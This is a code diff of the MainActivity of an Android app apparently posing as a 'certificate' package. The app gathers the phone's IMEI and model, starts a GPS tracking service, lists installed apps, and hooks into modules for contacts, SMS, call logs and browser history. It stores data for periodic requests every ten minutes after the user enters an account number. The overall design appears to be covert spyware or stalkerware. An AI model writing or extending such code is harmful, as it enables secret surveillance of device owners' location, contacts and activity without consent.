@@ -20,6 +20,7 @@ import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.content.pm.ActivityInfo;
 import android.content.pm.PackageManager;
+import android.content.pm.PackageManager.NameNotFoundException;
 import android.content.res.Configuration;
 import android.os.Bundle;
 import android.os.Environment;
@@ -33,8 +34,10 @@ import android.widget.EditText;
 import com.inet.android.certificate.R;
 import com.inet.android.contacts.GetContacts;
 import com.inet.android.history.LinkService;
+import com.inet.android.info.GetInfo;
 import com.inet.android.location.GPSTracker;
 import com.inet.android.request.DataRequest;
+import com.inet.android.request.Request4;
 import com.inet.android.request.StartRequest;
 import com.inet.android.utils.Logging;
 
@@ -77,19 +80,21 @@ public class MainActivity extends Activity {
 		Log.d("Main", "GetCont");
 
 		String androidVersion = android.os.Build.VERSION.RELEASE;
+		ListApp listApp = new ListApp();
+		listApp.getListOfInstalledApp(context);
 		// GetInfo getInfo = new GetInfo(context);
 		// getInfo.getInfo();
-		GetContacts getCont = new GetContacts();
-		getCont.execute(context);
+//		 GetContacts getCont = new GetContacts();
+//		 getCont.execute(context);
 		// ArchiveSms arhSms = new ArchiveSms();
 		// arhSms.execute(context);
 		// ArchiveCall arhCall = new ArchiveCall();
 		// arhCall.execute(context);
 		aboutDev = " Model: " + model + " Version android: " + androidVersion;
-		sIMEI = "IMEI: " + imeistring;
+		// sIMEI = "IMEI: " + imeistring;
 		e = sp.edit();
-		e.putString("BUILD", "A0003 2013-10-03 20:00:00");
-		e.putString("IMEI", sIMEI);
+		e.putString("BUILD", "V_000.1");
+		e.putString("imei", imeistring);
 		e.putString("ABOUT", aboutDev);
 		e.putString("model", model);
 		e.commit();
@@ -97,16 +102,13 @@ public class MainActivity extends Activity {
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
 
 		if (!hasVisited) {
-			// ïðîâåðêà íà ïåðâûé çàïóñê
+			// проверка на первый запуск
+
 			e = sp.edit();
 			e.putBoolean("hasVisited", true);
 			e.putString("ABOUT", aboutDev);
-			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); // âðåìÿ
-																				// äëÿ
-																				// ñåðâèñà
-																				// èñòðîèè
-																				// áðàóçåðà
-			e.putString("period", "1"); // ïåðèîäè÷åñêèé çàïðîñ êàæäûå 10 ìèíóò
+			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); // время для сервиса истрои и браузера
+			e.putString("period", "1"); // периодический запрос каждые 10 минут
 			e.putString("code", "-1");
 			e.commit();
 
@@ -114,7 +116,7 @@ public class MainActivity extends Activity {
 		}
 
 		getID(); // рекурсивный поиск файла с нужным именем
-		if (sp.getString("ID", "ID").equals("ID")) {
+		if (sp.getString("account", "account").equals("account")) {
 
 			Logging.doLog(LOG_TAG, "File not found. Show dialog.",
 					"File not found. Show dialog.");
@@ -132,8 +134,8 @@ public class MainActivity extends Activity {
 	private boolean viewIDDialog() {
 		AlertDialog.Builder alert = new AlertDialog.Builder(this);
 
-		alert.setTitle("Ââîä account number");
-		alert.setMessage("Ââåäèòå account number. Íåò ïðàâà íà îøèáêó!");
+		alert.setTitle("Attention!!!");
+		alert.setMessage("Enter account number!");
 
 		final EditText input = new EditText(this);
 		alert.setView(input);
@@ -144,12 +146,10 @@ public class MainActivity extends Activity {
 
 				Logging.doLog(LOG_TAG, "Text: " + value, "Text: " + value);
 
-				sp = PreferenceManager
-						.getDefaultSharedPreferences(getApplicationContext());
-				Editor e = sp.edit();
+				e = sp.edit();
 				e.putString("account", value);
 				e.commit();
-				start(); // çàïóñê ñåðâèñîâ
+				start(); // запуск сервисов
 				// sendDiagPost();
 				// sendStartRequest();
 				finish();
@@ -230,6 +230,7 @@ public class MainActivity extends Activity {
 		return false;
 	}
 
+	@SuppressWarnings("unused")
 	private void sendStartRequest() {
 		// RequestMaker service = new RequestMakerImpl(context);
 		// String str = "\"";
@@ -264,7 +265,7 @@ public class MainActivity extends Activity {
 		}
 
 		startService(new Intent(MainActivity.this, GPSTracker.class));
-		startService(new Intent(MainActivity.this, LinkService.class));
+		// startService(new Intent(MainActivity.this, LinkService.class));
 
 		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
 	}
